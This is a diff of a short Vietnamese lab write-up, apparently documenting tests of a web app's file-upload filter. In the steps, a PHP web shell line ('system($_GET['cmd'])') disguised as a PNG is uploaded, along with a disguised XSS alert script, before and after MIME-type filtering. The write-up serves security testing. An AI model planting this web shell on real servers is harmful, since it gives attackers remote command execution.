@@ -61,10 +61,11 @@ user: 12345
    <img width="1919" height="402" alt="image" src="https://github.com/user-attachments/assets/67d708b1-b16a-4702-99f8-d3304c5f90d1" />
 4. upload file shell.php.png (shell.php giả dạng) với nội dung là :"<?php system($_GET['cmd']);"
    <img width="457" height="259" alt="image" src="https://github.com/user-attachments/assets/fe62f1a0-9cee-40ca-9f19-0a58f97d093f" />
-5. kết quả thành công
+5. kết quả thành công khi upload file shell.php.png (shell.php giả dạng) với nội dung là :"<?php system($_GET['cmd']);"
    <img width="561" height="297" alt="image" src="https://github.com/user-attachments/assets/8f9ef91b-613b-44cd-a0c5-51c1daa2eb79" />
 6. upload xss.png (xss.php giả dạng) với nội dung:"<script>alert('XSS from PNG!')</script>"
    <img width="576" height="318" alt="image" src="https://github.com/user-attachments/assets/ef83b615-ba9c-4803-9874-206e08fef4d5" />
-7. sau khi lọc định dạng MIME
+7. sau khi lọc định dạng MIME và upload file shell.php.png (shell.php giả dạng) với nội dung là :"<?php system($_GET['cmd']);"
    <img width="507" height="294" alt="image" src="https://github.com/user-attachments/assets/3f789cac-d74d-4c36-8457-24aa91e94b8e" />
+8. sau khi lọc định dạng MIME và upload xss.png (xss.php giả dạng) với nội dung:"<script>alert('XSS from PNG!')</script>"
    <img width="487" height="244" alt="image" src="https://github.com/user-attachments/assets/945a41a2-75f3-4112-b9c7-5a9a04378649" />
